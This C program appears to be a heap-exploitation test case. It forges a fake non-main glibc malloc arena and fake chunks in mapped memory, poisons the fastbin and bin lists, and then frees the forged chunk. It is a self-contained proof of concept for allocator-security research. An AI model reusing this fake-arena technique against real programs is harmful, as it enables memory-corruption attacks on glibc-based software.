#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define NFASTBINS 10
#define NBINS 128
#define BINMAPSIZE 4
#define SIZE_SZ (sizeof(size_t))
#define PREV_INUSE 0x1
#define IS_MMAPPED 0x2
#define NON_MAIN_ARENA 0x4
#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)

#define chunksize(p)         ((p)->size & ~(SIZE_BITS))
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))
#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))

struct malloc_chunk {
  size_t prev_size;
  size_t size;
  struct malloc_chunk* fd;
  struct malloc_chunk* bk;
};
typedef struct malloc_chunk* mchunkptr;

struct malloc_state {
  int mutex;
  int flags;
  mchunkptr fastbinsY[NFASTBINS];
  mchunkptr top;
  mchunkptr last_remainder;
  mchunkptr bins[NBINS * 2 - 2];
  unsigned int binmap[BINMAPSIZE];
  struct malloc_state *next;
  struct malloc_state *next_free;
  size_t attached_threads;
  size_t system_mem;
  size_t max_system_mem;
};
typedef struct malloc_state* mstate;

typedef struct _heap_info {
  mstate ar_ptr;
} heap_info;

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS 0x20
#endif
#define ALIGN_NEXT(p, a) ((((uintptr_t)p) + a - 1) & ~(a - 1))

void timeout(int sig) {
  fprintf(stderr, "TIMEOUT!\n");
  exit(0);
}

int main() {
  signal(SIGALRM, timeout);
  alarm(1);

  char* mapped = mmap(NULL, 8*0x1000*0x1000, PROT_READ|PROT_WRITE,
                      MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  heap_info* heap = (heap_info*)ALIGN_NEXT(mapped, 4*0x1000*0x1000);
  mstate arena = (mstate)calloc(sizeof(struct malloc_state), 1);
  heap->ar_ptr = arena;
  arena->flags = 2;  // NONCONTIGUOUS_BIT
  arena->system_mem = 0x1000000;

  mchunkptr p = (mchunkptr)((uintptr_t)heap + 0x1000*0x1000);
  p->prev_size = 0;
  p->size = 0x11000 | PREV_INUSE | NON_MAIN_ARENA;

  mchunkptr np = chunk_at_offset(p, chunksize(p));
  np->size = 0x11000 | PREV_INUSE | NON_MAIN_ARENA;
  arena->top = np;
  mchunkptr nnp = chunk_at_offset(np, chunksize(np));
  nnp->size = 0x11000 | PREV_INUSE | NON_MAIN_ARENA;
  mchunkptr nnnp = chunk_at_offset(nnp, chunksize(nnp));
  nnnp->size = 0x11000 | PREV_INUSE | NON_MAIN_ARENA;

  arena->fastbinsY[0] = np;
  np->fd = np;
  arena->bins[0] = np;

  fprintf(stderr, "[+] goto free!\n");
  free(chunk2mem(p));
  fprintf(stderr, "[+] done free!\n");
}
